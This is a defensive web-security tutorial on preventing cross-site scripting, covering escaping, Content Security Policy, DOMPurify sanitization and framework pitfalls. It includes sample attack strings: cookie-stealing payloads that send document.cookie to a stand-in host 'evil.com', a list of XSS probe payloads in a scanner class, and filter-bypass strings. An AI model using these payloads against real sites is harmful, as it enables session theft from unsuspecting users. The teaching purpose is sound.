# XSS Prevention

> Understand the attack mechanisms of Reflected, Stored, and DOM-based XSS, and implement layered defenses using escaping, CSP, and sanitization.

## Prerequisites

- Fundamentals of HTML/JavaScript (DOM manipulation, event handlers)
- Basics of HTTP requests/responses
- Basic concepts of Same-Origin Policy
- How Cookies work ([02-csrf-clickjacking.md](./02-csrf-clickjacking.md))

## What You Will Learn

1. Understand the attack mechanisms and differences among **3 types of XSS** (Reflected/Stored/DOM-based)
2. Learn the correct implementation of **context-specific escaping** and sanitization
3. Develop effective defense strategies using **Content Security Policy (CSP)**
4. Recognize advanced attack techniques such as **Mutation XSS (mXSS)**
5. Learn **framework-specific considerations** and secure coding patterns

---

## 1. What is XSS (Cross-Site Scripting)?

XSS is an attack where an attacker injects malicious scripts into a web page and causes them to execute in other users' browsers. It is included in OWASP Top 10 2021 under A03:2021-Injection and is one of the most frequently discovered web vulnerabilities.

### 1.1 What XSS Attacks Can Do

```
Impact scope of XSS attacks:

  +---------------------------+----------------------------------------+
  | Attack Type               | Impact                                 |
  +---------------------------+----------------------------------------+
  | Cookie/Session Theft      | Reading document.cookie                |
  | Keystroke Logging         | Intercepting keystrokes (passwords etc)|
  | Phishing                  | Defacing page content (fake login form)|
  | Malware Distribution      | Drive-by downloads                     |
  | Worm Propagation          | Self-replicating XSS (Samy Worm etc)  |
  | Cryptocurrency Mining     | Unauthorized use of browser CPU       |
  | Internal Network Scanning | Internal exploration via browser pivot |
  | CSRF Attack Bypass        | Reading CSRF tokens → executing CSRF   |
  +---------------------------+----------------------------------------+
```

```
Basic flow of an XSS attack:

  Attacker                  Web Server                 Victim
    |                          |                        |
    |-- Inject malicious    -->|                        |
    |   script                 |                        |
    |                          |-- Deliver page with -->|
    |                          |   embedded script      |
    |                          |                        |-- Execute script
    |                          |                        |   in browser
    |<--- Steal Cookie/    ----|------------------------|
    |     session info         |                        |
```

### 1.2 Relationship Between XSS and Same-Origin Policy

```
Same-Origin Policy (SOP) and XSS:

  SOP is the foundation of the browser's security model:
  - Scripts from one origin (scheme + host + port) can only
    access resources from the same origin

  Why XSS is dangerous:
  - Scripts injected via XSS execute within the victim's origin
  - → They are not subject to SOP restrictions (considered same-origin)
  - → Free access to Cookies, DOM, local storage, etc.

  Example:
  Legitimate script: https://bank.com/app.js
    → Can access bank.com Cookies (SOP OK)

  Script injected via XSS: <script>alert(document.cookie)</script>
    → Executes within the bank.com page
    → Can access bank.com Cookies (SOP OK, because of XSS!)
```

---

## 2. Three Types of XSS

### 2.1 Reflected XSS

Scripts included in request parameters are reflected directly in the response. The attacker must trick the victim into clicking a malicious URL.

```python
# Code Example 1: Vulnerable code and countermeasures for Reflected XSS

# Vulnerable code
@app.route("/search")
def search_vulnerable():
    query = request.args.get("q", "")
    # Embedding user input directly into HTML -> XSS!
    return f"<h1>Search Results: {query}</h1>"
    # /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>

# Safe code
from markupsafe import escape

@app.route("/search")
def search_safe():
    query = request.args.get("q", "")
    # Apply HTML escaping
    return f"<h1>Search Results: {escape(query)}</h1>"
    # <script> -> &lt;script&gt; is converted

# Even safer: auto-escaping with template engine
from flask import render_template

@app.route("/search")
def search_best():
    query = request.args.get("q", "")
    # Jinja2 auto-escapes by default
    return render_template("search.html", query=query)
```

```
Attack scenario for Reflected XSS:

  Attacker → Sends email: "Please click here to verify"
    URL: https://bank.com/search?q=<script>
         fetch('https://evil.com/steal?cookie='+document.cookie)
         </script>

  Victim → Clicks the URL
    ↓
  bank.com → Receives the request
    ↓
  bank.com → Includes the value of q parameter as-is in the response
    ↓
  Victim's browser → Executes the script
    ↓
  Victim's Cookie is sent to evil.com
```

### 2.2 Stored XSS

A malicious script is saved in a database or similar storage and executes when other users access the page. This is the most dangerous type of XSS.

```python
# Code Example 2: Vulnerable code and countermeasures for Stored XSS

# Vulnerable code: comment submission
@app.route("/comments", methods=["POST"])
def post_comment_vulnerable():
    comment = request.form["comment"]
    # Saved as-is -> XSS occurs when displayed
    db.execute("INSERT INTO comments (body) VALUES (?)", (comment,))
    return redirect("/comments")

# Safe code: sanitization + escaping
import bleach

ALLOWED_TAGS = ["b", "i", "u", "a", "p", "br", "ul", "ol", "li", "blockquote"]
ALLOWED_ATTRS = {"a": ["href", "title"]}
ALLOWED_PROTOCOLS = ["http", "https", "mailto"]

@app.route("/comments", methods=["POST"])
def post_comment_safe():
    comment = request.form["comment"]
    # HTML sanitization: remove tags not in the allowlist
    clean_comment = bleach.clean(
        comment,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        protocols=ALLOWED_PROTOCOLS,
        strip=True,
    )
    db.execute("INSERT INTO comments (body) VALUES (?)", (clean_comment,))
    return redirect("/comments")
```

```
Why Stored XSS has greater impact:

  Reflected XSS:
  - Attacker must trick victim into clicking a specific URL
  - One redirect is required per victim

  Stored XSS:
  - Attack code is saved in the DB
  - Every user who accesses the page is affected
  - If an admin visits, admin privileges can be hijacked
  - Worm-style (self-replicating) attacks are possible

  Real example: Samy Worm (2005)
  - Placed Stored XSS on a MySpace profile page
  - Automatically copied the worm to profiles of users who viewed it
  - Infected over 1 million users in 20 hours
```

### 2.3 DOM-based XSS

Occurs when client-side JavaScript manipulates the DOM in an unsafe way, without going through the server.

```javascript
// Code Example 3: Vulnerable code and countermeasures for DOM-based XSS

// Vulnerable code
// XSS occurs when URL is: /page#<img src=x onerror=alert(1)>
const hash = location.hash.substring(1);
document.getElementById("content").innerHTML = hash; // Dangerous!

// Safe code: use textContent
const hash2 = location.hash.substring(1);
document.getElementById("content").textContent = hash2; // Not interpreted as HTML

// Safe code: sanitize with DOMPurify
import DOMPurify from "dompurify";

const hash3 = location.hash.substring(1);
const clean = DOMPurify.sanitize(hash3);
document.getElementById("content").innerHTML = clean;
```

```
Sources and Sinks in DOM-based XSS:

  Sources (attacker-controllable inputs):
  +-------------------------------+
  | location.href                 |
  | location.hash                 |
  | location.search               |
  | document.referrer             |
  | document.cookie               |
  | window.name                   |
  | Web Storage (localStorage)    |
  | postMessage data              |
  +-------------------------------+

  Sinks (output destinations where XSS can occur):
  +-------------------------------+-----------------------------+
  | innerHTML                     | Interpreted as HTML         |
  | outerHTML                     | Interpreted as HTML         |
  | document.write()              | Interpreted as HTML         |
  | eval()                        | Executed as JS              |
  | setTimeout(string)            | Executed as JS              |
  | setInterval(string)           | Executed as JS              |
  | Function(string)              | Executed as JS              |
  | element.src                   | Resource loading            |
  | element.href                  | Navigation                  |
  | jQuery.html()                 | Interpreted as HTML         |
  | jQuery.append()               | Interpreted as HTML         |
  +-------------------------------+-----------------------------+

  Safe alternatives:
  +-------------------------------+-----------------------------+
  | textContent (= innerText)     | Treated as plain text       |
  | setAttribute()                | Safely set as attribute     |
  | createElement() + appendChild()| Safely added as DOM node  |
  +-------------------------------+-----------------------------+
```

### 2.4 XSS Type Comparison Table

| Type | Storage | Attack Vector | Affected Scope | Detection Difficulty | Server Logs |
|------|---------|--------------|----------------|---------------------|-------------|
| Reflected | None (reflected in response) | URL/Form | Users who click the link | Medium | Yes |
| Stored | DB/File | Within application | All users who access the page | Low | Only at save time |
| DOM-based | None (client-side) | URL Fragment etc. | Users who click the link | High | None (# fragment is not sent to server) |

---

## 3. Context-Specific Escaping

To prevent XSS, appropriate escaping must be applied based on the **context** in which data is output. Using the wrong context's escaping renders the defense ineffective.

### 3.1 Classification of Output Contexts

```
Output contexts and escaping methods:

  +------------------+------------------------------+----------------------+
  | Context          | Escaping Method               | Example              |
  +------------------+------------------------------+----------------------+
  | HTML Body        | &lt; &gt; &amp; &quot; &#x27;| <p>{{user_input}}</p>|
  +------------------+------------------------------+----------------------+
  | HTML Attribute   | HTML attribute escaping       | <div title="{{..}}"> |
  +------------------+------------------------------+----------------------+
  | JavaScript       | JavaScript escaping (\xHH)    | var x = "{{..}}";    |
  +------------------+------------------------------+----------------------+
  | URL              | URL encoding (%HH)            | <a href="/s?q={{..}}">|
  +------------------+------------------------------+----------------------+
  | CSS              | CSS escaping (\HHHHHH)        | color: {{..}};       |
  +------------------+------------------------------+----------------------+

  Important: Be aware of nested contexts!

  <a href="javascript:alert('{{user_input}}')">
  → JavaScript context inside a URL context
  → Safest approach: completely prohibit javascript: URLs
```

```python
# Code Example 4: Implementation of context-specific escaping
import html
import json
from urllib.parse import quote

class XSSEncoder:
    """Context-specific escaping processing

    Each method corresponds to a specific HTML context.
    Using the wrong context's escaping causes XSS,
    so select the correct method based on the output destination.
    """

    @staticmethod
    def html_encode(s: str) -> str:
        """Escaping for HTML context

        Target: <p>{{here}}</p>, <div>{{here}}</div>
        Converts: < > & " ' → &lt; &gt; &amp; &quot; &#x27;
        """
        return html.escape(s, quote=True)

    @staticmethod
    def js_encode(s: str) -> str:
        """Escaping for JavaScript context

        Target: var x = "{{here}}";
        Converts: JSON.dumps generates a safe string literal
        Note: When outputting inside a <script> tag, strings
              containing </script> can prematurely terminate the script block
        """
        # Convert to safe JS literal using JSON.dumps
        encoded = json.dumps(s)
        # Prevent script block termination by </script>
        encoded = encoded.replace("</", "<\\/")
        return encoded

    @staticmethod
    def url_encode(s: str) -> str:
        """Escaping for URL context

        Target: <a href="/search?q={{here}}">
        Converts: Non-alphanumeric characters to %HH format
        """
        return quote(s, safe="")

    @staticmethod
    def attr_encode(s: str) -> str:
        """Escaping for HTML attributes

        Target: <div title="{{here}}">
        Converts: Non-alphanumeric characters to HTML character references
        Note: Attribute values must always be enclosed in quotes
        """
        result = []
        for ch in s:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"&#x{ord(ch):02x};")
        return "".join(result)

    @staticmethod
    def css_encode(s: str) -> str:
        """Escaping for CSS context

        Target: <style> .class { color: {{here}}; } </style>
        Converts: Non-alphanumeric characters to \\HHHHHH format
        """
        result = []
        for ch in s:
            if ch.isalnum():
                result.append(ch)
            else:
                result.append(f"\\{ord(ch):06x}")
        return "".join(result)

encoder = XSSEncoder()

# Usage examples
user_input = '<script>alert("XSS")</script>'

# HTML context
safe_html = f"<p>{encoder.html_encode(user_input)}</p>"
# => <p>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</p>

# JavaScript context
safe_js = f"var name = {encoder.js_encode(user_input)};"
# => var name = "<script>alert(\"XSS\")<\/script>";

# URL context
safe_url = f"/search?q={encoder.url_encode(user_input)}"
# => /search?q=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E
```

### 3.2 Dangerous Contexts (Where Escaping Alone is Insufficient)

```
Contexts where escaping alone is insufficient:

  1. javascript: URLs:
     <a href="javascript:{{user_input}}">
     → Cannot be made safe with any escaping
     → Countermeasure: completely block URLs starting with javascript:

  2. Event handlers:
     <div onmouseover="{{user_input}}">
     → Dangerous through two stages: HTML decode → JS execution
     → Countermeasure: never put user input in event handler attributes

  3. CSS expression (IE):
     <div style="background: expression({{user_input}})">
     → Can execute JS from CSS (old IE)
     → Countermeasure: never put user input in style attributes

  4. Inside <script> tags:
     <script>var x = "{{user_input}}";</script>
     → Can inject another script by early termination with </script>
     → Countermeasure: output as JSON to external file, or
                       store in data-attribute and read from JS

  Recommended pattern:
  <div id="data" data-user-name="{{html_encode(user_input)}}"></div>
  <script>
    const name = document.getElementById('data').dataset.userName;
  </script>
```

---

## 4. Content Security Policy (CSP)

CSP is a security header that instructs browsers to restrict the origins from which scripts and resources can be loaded. It acts as the "last line of defense" that significantly mitigates the impact of XSS.

### 4.1 How CSP Works

```
How CSP works:

  Server                             Browser
    |                                  |
    |-- Response with CSP header -->   |
    |   Content-Security-Policy:       |
    |   script-src 'self'              |
    |                                  |
    |                                  |-- Own site's .js files
    |                                  |   => Execution allowed ✓
    |                                  |
    |                                  |-- <script>alert(1)</script>
    |                                  |   => Blocked ✗ (inline script)
    |                                  |
    |                                  |-- <script src="evil.com/x.js">
    |                                  |   => Blocked ✗ (external domain)
    |                                  |
    |                                  |-- Report CSP violation
    |                                  |   → Sent to report-uri
```

### 4.2 CSP Directive Details

```
Main CSP directives:

  +---------------------+---------------------------------------------+
  | Directive           | Controls                                    |
  +---------------------+---------------------------------------------+
  | default-src         | Fallback for other directives               |
  | script-src          | <script> tags, inline scripts               |
  | style-src           | <style> tags, inline styles                 |
  | img-src             | <img> tags                                  |
  | font-src            | Font loading via @font-face                 |
  | connect-src         | fetch / XHR / WebSocket connection targets  |
  | frame-src           | Source of <iframe> content                  |
  | frame-ancestors     | Origins allowed to embed this page in iframe|
  | media-src           | <video> / <audio> tags                      |
  | object-src          | <object> / <embed> / <applet>               |
  | base-uri            | href of <base> tag                          |
  | form-action         | action attribute of <form>                  |
  | report-uri          | Destination for CSP violation reports       |
  | report-to           | Destination for CSP violation reports (new) |
  +---------------------+---------------------------------------------+

  Source values:
  +---------------------+---------------------------------------------+
  | 'self'              | Same origin only                            |
  | 'none'              | Block all                                   |
  | 'unsafe-inline'     | Allow inline scripts/styles (not recommended)|
  | 'unsafe-eval'       | Allow eval() (not recommended)              |
  | 'nonce-{random}'    | Allow only scripts with the specified nonce |
  | 'strict-dynamic'    | Scripts loaded by nonce-approved scripts    |
  |                     | are automatically allowed                   |
  | https:              | Resources via HTTPS only                    |
  | data:               | Allow data: URLs                            |
  | blob:               | Allow blob: URLs                            |
  | *.example.com       | Wildcard for subdomains                     |
  +---------------------+---------------------------------------------+
```

```python
# Code Example 5: Gradual CSP introduction
import secrets

class CSPBuilder:
    """Helper for building Content Security Policy"""

    def __init__(self):
        self.directives = {}

    def add_directive(self, directive: str, *sources: str) -> 'CSPBuilder':
        self.directives.setdefault(directive, []).extend(sources)
        return self

    def build(self) -> str:
        parts = []
        for directive, sources in self.directives.items():
            parts.append(f"{directive} {' '.join(sources)}")
        return "; ".join(parts)

    def build_report_only(self) -> dict:
        """Report-only mode (start with monitoring first)"""
        return {
            "Content-Security-Policy-Report-Only": self.build()
        }

    def build_enforced(self) -> dict:
        """Enforced mode"""
        return {
            "Content-Security-Policy": self.build()
        }

# Gradual CSP introduction
# Step 1: Confirm impact with report-only
csp_step1 = (CSPBuilder()
    .add_directive("default-src", "'self'")
    .add_directive("script-src", "'self'", "'unsafe-inline'")  # Temporarily allowed
    .add_directive("style-src", "'self'", "'unsafe-inline'")
    .add_directive("report-uri", "/csp-report")
)

# Step 2: Convert inline scripts to nonce-based
nonce = secrets.token_urlsafe(32)
csp_step2 = (CSPBuilder()
    .add_directive("default-src", "'self'")
    .add_directive("script-src", "'self'", f"'nonce-{nonce}'")
    .add_directive("style-src", "'self'", f"'nonce-{nonce}'")
    .add_directive("img-src", "'self'", "data:", "https:")
    .add_directive("connect-src", "'self'", "https://api.example.com")
    .add_directive("frame-ancestors", "'none'")
    .add_directive("report-uri", "/csp-report")
)

# Step 3: Strictest CSP (strict-dynamic)
csp_strict = (CSPBuilder()
    .add_directive("default-src", "'none'")
    .add_directive("script-src", "'self'", "'strict-dynamic'",
                   f"'nonce-{nonce}'")
    .add_directive("style-src", "'self'", f"'nonce-{nonce}'")
    .add_directive("img-src", "'self'")
    .add_directive("font-src", "'self'")
    .add_directive("connect-src", "'self'")
    .add_directive("frame-ancestors", "'none'")
    .add_directive("base-uri", "'self'")
    .add_directive("form-action", "'self'")
)
```

### 4.3 Implementing Nonce-based CSP

```python
# Code Example 6: Nonce-based CSP implementation in Flask
from flask import Flask, request, g, render_template
import secrets

app = Flask(__name__)

@app.before_request
def generate_nonce():
    """Generate a unique nonce per request"""
    g.csp_nonce = secrets.token_urlsafe(32)

@app.after_request
def add_csp_header(response):
    """Set CSP header"""
    nonce = g.get('csp_nonce', '')
    csp = (
        f"default-src 'none'; "
        f"script-src 'self' 'nonce-{nonce}' 'strict-dynamic'; "
        f"style-src 'self' 'nonce-{nonce}'; "
        f"img-src 'self' data: https:; "
        f"font-src 'self'; "
        f"connect-src 'self'; "
        f"frame-ancestors 'none'; "
        f"base-uri 'self'; "
        f"form-action 'self'; "
        f"report-uri /csp-report"
    )
    response.headers['Content-Security-Policy'] = csp
    return response

@app.context_processor
def inject_nonce():
    """Inject nonce into templates"""
    return {'csp_nonce': g.get('csp_nonce', '')}

# Template (template.html):
# <script nonce="{{ csp_nonce }}">
#   // This script executes (nonce matches)
#   console.log("Safe inline script");
# </script>
#
# <script>
#   // This script is blocked (no nonce)
#   alert("This will be blocked by CSP");
# </script>
```

### 4.4 Processing CSP Violation Reports

```python
# Code Example 7: Receiving and analyzing CSP violation reports
from flask import Flask, request, jsonify
import json
import logging

app = Flask(__name__)
logger = logging.getLogger("csp_reports")

@app.route("/csp-report", methods=["POST"])
def csp_report():
    """Receive CSP violation reports"""
    try:
        report = json.loads(request.data)
        csp_report = report.get("csp-report", {})

        # Log report contents
        logger.warning(
            "CSP Violation: "
            f"blocked-uri={csp_report.get('blocked-uri', 'unknown')}, "
            f"violated-directive={csp_report.get('violated-directive', 'unknown')}, "
            f"document-uri={csp_report.get('document-uri', 'unknown')}, "
            f"source-file={csp_report.get('source-file', 'unknown')}, "
            f"line-number={csp_report.get('line-number', 'unknown')}"
        )

        # Alert on critical violations
        violated = csp_report.get("violated-directive", "")
        if "script-src" in violated:
            # Script execution violation → possible XSS attack
            alert_security_team(csp_report)

        return "", 204
    except Exception as e:
        logger.error(f"Failed to process CSP report: {e}")
        return "", 400

def alert_security_team(report: dict):
    """Send alert to security team"""
    # Notification to Slack, PagerDuty, etc.
    pass
```

---

## 5. Sanitization with DOMPurify

```javascript
// Code Example 8: Detailed configuration of DOMPurify
import DOMPurify from "dompurify";

// === Basic usage ===
const dirty = '<img src=x onerror=alert(1)//>';
const clean = DOMPurify.sanitize(dirty);
// => '<img src="x">' (onerror attribute is removed)

// === Custom configuration ===
const config = {
    // Allowed tags
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br',
                   'ul', 'ol', 'li', 'h1', 'h2', 'h3',
                   'blockquote', 'code', 'pre'],

    // Allowed attributes
    ALLOWED_ATTR: ['href', 'title', 'class'],

    // Prohibit javascript: URLs
    ALLOW_DATA_ATTR: false,

    // Automatically add target="_blank" and rel="noopener" to <a> tags
    ADD_ATTR: ['target'],

    // Add rel="noopener noreferrer" to all links
    WHOLE_DOCUMENT: false,

    // Whether to allow SVG tags
    USE_PROFILES: {svg: false, svgFilters: false, mathMl: false},
};

const cleanHtml = DOMPurify.sanitize(userHtml, config);

// === Hook functionality ===
// Add custom processing during sanitization
DOMPurify.addHook('afterSanitizeAttributes', function(node) {
    // Add target="_blank" and rel="noopener" to all <a> tags
    if (node.tagName === 'A') {
        node.setAttribute('target', '_blank');
        node.setAttribute('rel', 'noopener noreferrer');
    }
    // Change image src to go through a proxy
    if (node.tagName === 'IMG' && node.getAttribute('src')) {
        const originalSrc = node.getAttribute('src');
        node.setAttribute('src', `/proxy/image?url=${encodeURIComponent(originalSrc)}`);
    }
});

// === Integration with Trusted Types ===
// Integration with the browser's Trusted Types API
if (window.trustedTypes && window.trustedTypes.createPolicy) {
    const policy = trustedTypes.createPolicy('default', {
        createHTML: (input) => DOMPurify.sanitize(input, config),
    });
}
```

---

## 6. Built-in Countermeasures by Framework

### 6.1 Framework Comparison

| Framework | Auto Escaping | CSP Support | Notes |
|-----------|:------------:|:-----------:|-------|
| React | Auto-escape with `{}` | Helmet | Beware of `dangerouslySetInnerHTML` |
| Angular | Sanitized by default | Built-in | Beware of `bypassSecurityTrust*` |
| Vue.js | Auto-escape with `{{ }}` | Manual | Beware of `v-html` |
| Django | Auto-escape in templates | middleware | Beware of `|safe` filter |
| Flask/Jinja2 | Auto-escape (when enabled) | Manual | Beware of `|safe` filter and `Markup()` |
| Next.js | React's auto-escape | Config file | Beware of XSS during SSR |

### 6.2 Safe Rendering in React

```javascript
// Code Example 9: Safe rendering in React
import DOMPurify from "dompurify";

// Safe: JSX auto-escapes
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>; // Not interpreted as HTML
}

// Safe: Attribute values are also auto-escaped
function SafeAttribute({ userInput }) {
  return <div title={userInput}>Content</div>;
  // " is escaped to &#34;
}

// Dangerous: avoid dangerouslySetInnerHTML
function DangerousComponent({ htmlContent }) {
  // If absolutely necessary, sanitize with DOMPurify
  const clean = DOMPurify.sanitize(htmlContent, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
    ALLOWED_ATTR: ["href", "title"],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// Dangerous: user input in href attribute
function DangerousLink({ userUrl }) {
  // NG: XSS can occur with javascript: URLs
  // return <a href={userUrl}>Click</a>;

  // OK: Validate the protocol
  const safeUrl = sanitizeUrl(userUrl);
  return <a href={safeUrl}>Click</a>;
}

function sanitizeUrl(url) {
  try {
    const parsed = new URL(url);
    if (['http:', 'https:', 'mailto:'].includes(parsed.protocol)) {
      return url;
    }
    return '#'; // Block unsafe protocols
  } catch {
    return '#'; // Block invalid URLs
  }
}

// Safe: Passing data in SSR
function ServerSideData({ serverData }) {
  // NG: <script>window.__DATA__ = {serverData}</script>
  // → Risk of XSS

  // OK: Escape with JSON.stringify and store in data attribute
  return (
    <div id="app-data"
         data-config={JSON.stringify(serverData)}>
    </div>
  );
}
```

### 6.3 Safe Rendering in Vue.js

```javascript
// Code Example 10: Safe rendering in Vue.js

// Safe: Mustache syntax auto-escapes
// <template>
//   <p>{{ userInput }}</p>
//   <!-- <script>alert(1)</script> → &lt;script&gt;alert(1)&lt;/script&gt; -->
// </template>

// Dangerous: v-html is interpreted as HTML
// <template>
//   <div v-html="userHtml"></div>
//   <!-- Risk of XSS -->
// </template>

// Safe: v-html + DOMPurify
import DOMPurify from 'dompurify';

export default {
  computed: {
    safeHtml() {
      return DOMPurify.sanitize(this.userHtml, {
        ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href'],
      });
    }
  }
};
// <template>
//   <div v-html="safeHtml"></div>
// </template>

// Global directive for Vue.js (v-safe-html)
// app.directive('safe-html', {
//   mounted(el, binding) {
//     el.innerHTML = DOMPurify.sanitize(binding.value);
//   },
//   updated(el, binding) {
//     el.innerHTML = DOMPurify.sanitize(binding.value);
//   }
// });
```

---

## 7. Mutation XSS (mXSS)

```
What is Mutation XSS (mXSS):

  An attack where seemingly harmless input is converted into harmful
  content during the browser's HTML parser "correction" process

  Example:
  Input: <p><svg><style><img src=x onerror=alert(1)>

  Sanitizer processes:
    → <p>, <svg>, <style> are allowed tags
    → <img> is inside <style>, so deemed non-executable
    → Passes through

  Browser processes:
    → Re-parses the HTML inside SVG's <style>
    → <img src=x onerror=alert(1)> is interpreted as valid HTML
    → XSS occurs!

  Countermeasures:
  - Use DOMPurify (has built-in protection against mXSS)
  - Custom sanitizers are often vulnerable to mXSS
  - Adopt the Trusted Types API
```

```
Trusted Types API:

  Browser-native XSS protection:
  - Controls assignments to dangerous sinks like innerHTML
  - HTML strings can only be generated through trusted policies

  Enable via CSP:
  Content-Security-Policy: require-trusted-types-for 'script';
                           trusted-types dompurify default;

  JavaScript:
  // Define a policy
  const policy = trustedTypes.createPolicy('dompurify', {
    createHTML: (input) => DOMPurify.sanitize(input),
  });

  // Usage (assigning to innerHTML without Trusted Types causes an error)
  element.innerHTML = policy.createHTML(userInput);
  // OK: Safe HTML passed through DOMPurify

  element.innerHTML = userInput;
  // TypeError: This document requires 'TrustedHTML' assignment
```

---

## 8. Edge Cases

### Edge Case 1: Bypassing via Character Encoding

```
UTF-7 XSS (old browsers/configurations):

  When charset is not specified in Content-Type,
  old IE could interpret content as UTF-7

  Input: +ADw-script+AD4-alert(1)+ADw-/script+AD4-
  UTF-7 decoded: <script>alert(1)</script>

  Countermeasures:
  - Always specify charset=utf-8 in Content-Type header
  - Set X-Content-Type-Options: nosniff
  - Place <meta charset="UTF-8"> at the beginning of HTML
```

### Edge Case 2: XSS in JSON Responses

```
XSS in JSON responses:

  Response:
  Content-Type: application/json
  {"name": "<script>alert(1)</script>"}

  Normally safe (JSON is not interpreted as HTML)

  However, dangerous in the following cases:
  1. Content-Type is incorrectly set to text/html
  2. IE's Content-Type sniffing is enabled
  3. When returning as JSONP

  Countermeasures:
  - Correctly set Content-Type: application/json
  - Set X-Content-Type-Options: nosniff
  - Prepend ")]}',\n" to JSON responses (Angular method)
  - Escape </ in JSON to \u003c\u002f
```

### Edge Case 3: XSS in SVG Files

```
XSS in SVG files:

  SVG is XML-based and can contain <script> tags

  <svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.cookie)</script>
  </svg>

  Attack scenario:
  1. User uploads an SVG file
  2. Server serves the SVG as-is
  3. Another user views the SVG → XSS

  Countermeasures:
  - Remove <script> tags from uploaded SVGs
  - Serve SVGs from a separate domain (CDN etc.)
  - Prevent display with Content-Disposition: attachment
  - Remove event handlers (onclick etc.) from within SVG
  - Load via <img src="uploaded.svg">
    (scripts do not execute when loaded through <img>)
```

---

## 9. Testing Methods

```python
# Code Example 11: Testing for XSS vulnerabilities
import requests
from typing import List, Dict

class XSSTester:
    """Basic XSS vulnerability testing"""

    BASIC_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<details open ontoggle=alert(1)>',
        '<body onload=alert(1)>',
    ]

    ATTRIBUTE_PAYLOADS = [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" autofocus onfocus="alert(1)',
    ]

    DOM_PAYLOADS = [
        '#<img src=x onerror=alert(1)>',
        '#"><svg onload=alert(1)>',
    ]

    def test_reflected(self, url: str, param: str) -> List[Dict]:
        """Reflected XSS test"""
        results = []
        for payload in self.BASIC_PAYLOADS:
            response = requests.get(url, params={param: payload})
            reflected = payload in response.text
            encoded = any(
                enc in response.text
                for enc in [
                    payload.replace("<", "&lt;"),
                    payload.replace('"', "&quot;"),
                ]
            )
            results.append({
                "payload": payload,
                "reflected_raw": reflected,
                "properly_encoded": encoded,
                "vulnerable": reflected and not encoded,
            })
        return results

    def test_csp_headers(self, url: str) -> Dict:
        """Check CSP headers"""
        response = requests.get(url)
        csp = response.headers.get("Content-Security-Policy", "")
        csp_report = response.headers.get(
            "Content-Security-Policy-Report-Only", "")

        issues = []
        if not csp and not csp_report:
            issues.append("CSP header missing")
        if "'unsafe-inline'" in csp:
            issues.append("'unsafe-inline' in script-src")
        if "'unsafe-eval'" in csp:
            issues.append("'unsafe-eval' in script-src")
        if "default-src" not in csp and "script-src" not in csp:
            issues.append("No script-src or default-src directive")

        return {
            "csp": csp,
            "csp_report_only": csp_report,
            "issues": issues,
            "score": max(0, 100 - len(issues) * 25),
        }

# Usage example (only run in a permitted environment)
# tester = XSSTester()
# results = tester.test_reflected("http://localhost:8080/search", "q")
```

---

## 10. Performance Considerations

```
Performance impact of XSS countermeasures:

  +-----------------------------+------------------+------------------+
  | Countermeasure              | Server-side      | Client-side      |
  +-----------------------------+------------------+------------------+
  | HTML escaping               | ~0.01ms/process  | None             |
  | Template engine             | ~0.1ms/render    | None             |
  | (auto-escaping)             |                  |                  |
  +-----------------------------+------------------+------------------+
  | DOMPurify sanitization      | N/A              | ~1-5ms/process   |
  | (client-side)               |                  | (depends on HTML)|
  +-----------------------------+------------------+------------------+
  | CSP header                  | ~0.01ms          | Parse: ~0.1ms    |
  |                             | (header addition)| Verify: ~0.01ms/ |
  |                             |                  |  resource load   |
  +-----------------------------+------------------+------------------+
  | CSP nonce generation        | ~0.05ms          | None             |
  +-----------------------------+------------------+------------------+

  Conclusion:
  - Performance impact of XSS countermeasures is nearly negligible
  - DOMPurify may take a few ms on very large HTML, but within acceptable range
  - CSP can actually improve performance by restricting
    resource loading (blocking unnecessary external resources)
```

---

## Exercises

### Exercise 1: Basic — Context-Specific Escaping

**Task**: Implement escaping functions to safely output in each of the following contexts.

```
Requirements:
1. Escaping for HTML body context
2. Escaping for HTML attribute context (with quotes)
3. Escaping for JavaScript context
4. Escaping for URL context

Tests:
- Input <script>alert(1)</script> into each function and verify no XSS occurs
- Verify that each of " ' < > & is correctly escaped
```

### Exercise 2: Applied — Gradual CSP Introduction

**Task**: Gradually introduce CSP into an existing web application.

```
Requirements:
1. Configure CSP in Report-Only mode
2. Implement an endpoint to collect and analyze CSP violation reports
3. Rewrite inline scripts to nonce-based
4. Create an allowlist of external resources
5. Switch to enforced mode

Verification:
- Evaluate the policy using Google CSP Evaluator
- Check CSP violations in the browser DevTools Console
```

### Exercise 3: Advanced — XSS Vulnerability Scanner

**Task**: Implement a simple XSS vulnerability scanner.

```
Requirements:
1. Test for Reflected XSS by specifying URL and parameter name
2. Try multiple payloads (<script>, <img onerror>, <svg onload>, etc.)
3. Detect whether the payload is reflected unescaped in the response
4. Analyze the presence and configuration of CSP headers
5. Generate a report of test results

Note: Only run against servers you manage
```

---

## Anti-patterns

### Anti-pattern 1: Blacklist-based Filtering

An approach that only filters `<script>` tags. Since there are countless XSS bypass techniques, a blacklist cannot provide sufficient protection. A whitelist approach (limiting allowed tags and attributes) should be used instead.

```python
# NG: Blacklist approach
def sanitize_bad(input_html):
    return input_html.replace("<script>", "").replace("</script>", "")
# Bypass: <scr<script>ipt>alert(1)</scr</script>ipt>
# Bypass: <ScRiPt>alert(1)</ScRiPt>
# Bypass: <img src=x onerror=alert(1)>
# Bypass: <svg onload=alert(1)>

# OK: Whitelist approach (DOMPurify or bleach)
import bleach
def sanitize_good(input_html):
    return bleach.clean(input_html,
                       tags=["b", "i", "a"],
                       attributes={"a": ["href"]})
```

### Anti-pattern 2: Client-side Only Countermeasures

A pattern that relies solely on input validation in JavaScript. Attackers can send requests directly to the API without going through the browser, so server-side validation is mandatory.

### Anti-pattern 3: Overuse of innerHTML

```javascript
// NG: Assigning user input to innerHTML
